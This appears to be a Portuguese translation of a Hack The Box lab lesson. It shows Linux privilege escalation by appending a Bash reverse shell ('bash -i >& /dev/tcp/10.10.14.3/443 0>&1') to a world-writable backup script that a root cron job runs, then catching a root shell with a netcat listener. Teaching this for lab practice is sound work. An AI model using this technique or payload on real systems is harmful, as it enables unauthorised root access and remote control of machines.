Os cron jobs também podem ser definidos para serem executados uma vez (como na inicialização). Eles são normalmente usados ​​para tarefas administrativas, como executar backups, limpar diretórios, etc. O comando `crontab` pode criar um arquivo cron, que será executado pelo daemon cron no cronograma especificado.

Quando criado, o arquivo cron será criado `/var/spool/cron` para o usuário específico que o criou. Cada entrada no arquivo crontab requer seis itens na seguinte ordem: minutos, horas, dias, meses, semanas, comandos. Por exemplo, a entrada `0 */12 * * * /home/admin/backup.sh`seria executada a cada 12 horas.

Certos aplicativos criam arquivos cron no diretório `/etc/cron.d` e podem estar configurados incorretamente para permitir que um usuário não root os edite.

Primeiro, vamos dar uma olhada no sistema para ver se há arquivos ou diretórios graváveis. O arquivo `backup.sh` no diretório `/dmz-backups` é interessante e parece que pode estar sendo executado em um cron job.

```shell-session
NycolasES6@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control

<SNIP>
/home/backupsvc/backup.sh

<SNIP>
```

Uma rápida olhada no diretório `/dmz-backups` mostra o que parecem ser arquivos criados a cada três minutos. Isso parece ser uma grande configuração incorreta. Talvez o administrador do sistema quisesse especificar a cada três horas como, `0 */3 * * *` mas em vez disso escreveu `*/3 * * * *`, que diz ao cron job para executar a cada três minutos. O segundo problema é que o `backup.sh`script de shell é mundialmente gravável e é executado como root.

```shell-session
NycolasES6@htb[/htb]$ ls -la /dmz-backups/

total 36
drwxrwxrwx  2 root root 4096 Aug 31 02:39 .
drwxr-xr-x 24 root root 4096 Aug 31 02:24 ..
-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh
-rw-r--r--  1 root root 3336 Aug 31 02:24 www-backup-2020831-02:24:01.tgz
-rw-r--r--  1 root root 3336 Aug 31 02:27 www-backup-2020831-02:27:01.tgz
```

Podemos confirmar que um cron job está em execução usando [pspy](https://github.com/DominicBreuker/pspy) , uma ferramenta de linha de comando usada para visualizar processos em execução sem a necessidade de privilégios de root.

Podemos usá-la para ver comandos executados por outros usuários, cron jobs, etc. Ela funciona escaneando [procfs](https://en.wikipedia.org/wiki/Procfs) .

Vamos executar `pspy` e dar uma olhada. O sinalizador `-pf` diz à ferramenta para imprimir comandos e eventos do sistema de arquivos e `-i 1000` diz a ela para escanear [procfs](https://man7.org/linux/man-pages/man5/procfs.5.html) a cada 1000ms (ou a cada segundo).

```shell-session
NycolasES6@htb[/htb]$ ./pspy64 -pf -i 1000

pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2020/09/04 20:45:03 CMD: UID=0    PID=999    | /usr/bin/VGAuthService 
2020/09/04 20:45:03 CMD: UID=111  PID=990    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation 
2020/09/04 20:45:03 CMD: UID=0    PID=99     | 
2020/09/04 20:45:03 CMD: UID=0    PID=988    | /usr/lib/snapd/snapd 

<SNIP>
```

Na saída acima, podemos ver que uma tarefa cron executa o script `backup.sh` localizado no `/dmz-backups`diretório e cria um arquivo tarball do conteúdo do diretório `/var/www/html`.

Podemos olhar o script de shell e anexar um comando a ele para tentar obter um shell reverso como root. Se estiver editando um script, certifique-se de sempre fazer uma cópia do script e/ou criar um backup dele. Também devemos tentar anexar nossos comandos ao final do script para que ele ainda seja executado corretamente antes de executar nosso comando de shell reverso.

```shell-session
NycolasES6@htb[/htb]$ cat /dmz-backups/backup.sh 

#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

Podemos ver que o script está apenas pegando um diretório de origem e destino como variáveis. Ele então especifica um nome de arquivo com a data e hora atuais do backup e cria um tarball do diretório de origem, o diretório raiz da web. Vamos modificar o script para adicionar um [Bash one-liner reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) .

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

Modificamos o script, criamos um `netcat`ouvinte local e esperamos. Com certeza, em três minutos, temos um shell root!

```shell-session
NycolasES6@htb[/htb]$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882
bash: cannot set terminal process group (9143): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id
id
uid=0(root) gid=0(root) groups=0(root)

root@NIX02:~# hostname
hostname
NIX02
```

Embora não seja o ataque mais comum, encontramos tarefas cron mal configuradas que podem ser abusadas de tempos em tempos.

















